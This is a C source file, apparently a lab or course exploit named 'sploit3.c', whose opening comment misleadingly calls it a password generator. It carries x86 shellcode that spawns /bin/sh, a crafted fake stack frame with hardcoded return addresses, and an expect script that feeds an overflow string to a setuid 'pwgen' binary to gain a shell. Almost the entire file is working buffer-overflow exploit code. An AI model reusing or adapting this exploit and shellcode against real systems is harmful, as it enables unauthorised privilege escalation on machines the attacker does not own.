/*
 * A program that randomly generates a password and sets that as your 
password
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define BUFFER 1000
#define PASS_SIZE 8
#define TEMP_FILENAME "/tmp/pwgen_random"
#define PASSWD_FILENAME "/etc/passwd"
#define FILENAME "/share/expect.sh"

static char shellcode[] =
  "MA=\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b"
  "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd"
  "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";
//cd /share && gcc -Wall -ggdb sploit3.c -o /home/user/sploit3 && ~/sploit3
// Main
int main(int argc, char* argv[]) {
    FILE* fd;
    char *binary = "/usr/local/bin/pwgen";
    char *overflow_trigger = "0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891234\x04"; 
    // now, I gonna keep pushing it 0xffbfdfb9, the argc = 0x11111104 and argv = 0xffbfde44
    char *fake_stack = "--seed=\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\xb9\\xdf\\xbf\\xff\\x11\\x11\\x11\\x11\\x04\\x11\\x11\\x11\\x44\\xde\\xbf\\xff\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11";
    // the exploit now return at c, and without any padding our fake_stack stops at 0xffbfdd30. we need some really long padding to push that down
    char *padding = "--salt=12345678901234567890123456789012345678901234567890123456789012345678901234567890";

    char buffer[5000];

    printf("setting up bash script");

    snprintf(buffer, 5000, "#/bin/bash \n\nenv -i HOME=/home/user $\'%s\' %s $\'%s\' -e -h %s", shellcode, binary, fake_stack, padding);

    fd = fopen(FILENAME, "w");
    fwrite(buffer, strlen(buffer), sizeof(char), fd);
    fclose(fd);
    printf("running expect\n");
    snprintf(buffer, 5000, "expect -c \'spawn bash /share/expect.sh;expect \"Type stuff so I can gather entropy, Ctrl-D to end:\";send \"%s\n\";interact\'",overflow_trigger);
    system(buffer);

    return 0;
}
